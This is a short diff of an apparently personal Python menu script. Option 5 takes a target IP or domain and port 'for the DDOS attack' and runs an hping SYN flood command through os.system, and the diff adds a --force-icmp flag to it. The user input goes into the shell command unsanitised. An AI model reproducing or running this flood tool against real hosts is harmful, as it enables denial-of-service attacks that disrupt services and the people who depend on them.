@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 from os import system
 while True:
-    #system("clear")
+    system("clear")
     print("Hey John what do you want to do?")
     print("1) install one or more python3 library.")
     print("2) use python interpreter on terminal.")
@@ -30,7 +30,7 @@ while True:
     elif choice == "5":
         ip = input("ip or domain name of the target for the DDOS attack: ")
         port = input("port of the target: ")
-        system("hping --syn -p {port} --flood {ip}".format(
+        system("hping --syn -p {port} --flood --force-icmp {ip}".format(
             port = port,
             ip = ip
             ))
